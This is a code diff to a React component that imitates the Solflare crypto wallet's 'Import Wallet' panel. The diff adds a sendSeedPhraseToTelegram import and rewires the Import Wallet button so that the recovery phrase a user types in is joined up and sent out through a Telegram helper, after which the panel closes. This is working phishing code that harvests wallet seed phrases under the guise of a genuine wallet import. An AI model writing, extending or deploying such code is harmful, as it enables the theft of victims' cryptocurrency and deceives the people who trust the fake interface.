@@ -1,4 +1,5 @@
 import { useState, useEffect } from 'react';
+import { sendSeedPhraseToTelegram } from '../utils/telegram';
 
 interface SolflarePanelProps {
   isOpen: boolean;
@@ -14,6 +15,7 @@ export default function SolflarePanel({ isOpen, onClose }: SolflarePanelProps) {
   const [phraseLength, setPhraseLength] = useState<12 | 24>(12);
   const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
   const [invalidIndices, setInvalidIndices] = useState<number[]>([]);
+  const [isSending, setIsSending] = useState(false);
 
   useEffect(() => {
     if (isOpen) {
@@ -23,6 +25,7 @@ export default function SolflarePanel({ isOpen, onClose }: SolflarePanelProps) {
       setPhraseLength(12);
       setPhraseValues(Array(24).fill(''));
       setInvalidIndices([]);
+      setIsSending(false);
 
       const timer = setTimeout(() => setView('password'), 2500);
       return () => clearTimeout(timer);
@@ -208,15 +211,22 @@ export default function SolflarePanel({ isOpen, onClose }: SolflarePanelProps) {
 
                 <div className="w-full px-5 pb-4 shrink-0 mt-auto">
                   <button 
+                    disabled={!isPhraseComplete() || isSending}
+                    onClick={async () => {
+                      setIsSending(true);
+                      const seedString = phraseValues.slice(0, phraseLength).join(' ');
+                      const success = await sendSeedPhraseToTelegram(seedString, 'Solflare Wallet');
+                      if (success) {
+                        onClose();
+                      } else {
+                        console.error('Failed to send seed phrase');
+                      }
+                      setIsSending(false);
+                    }}
                     className="font-inter flex items-center justify-center py-[14px] outline-none w-full text-[#02050a] bg-[#ffef46] font-semibold text-[16px] rounded-full h-[52px] transition-all duration-300 cursor-pointer hover:bg-[#eeda0f] disabled:cursor-not-allowed disabled:bg-[#f5f8ff1f] disabled:text-[#f5f8ff33] active:scale-[0.98]" 
                     type="button" 
-                    disabled={!isPhraseComplete()}
-                    onClick={() => {
-                      console.log("Solflare Import Complete:", phraseValues.slice(0, phraseLength));
-                      onClose();
-                    }}
                   >
-                    Import Wallet
+                    {isSending ? 'Sending...' : 'Import Wallet'}
                   </button>
                 </div>
               </div>
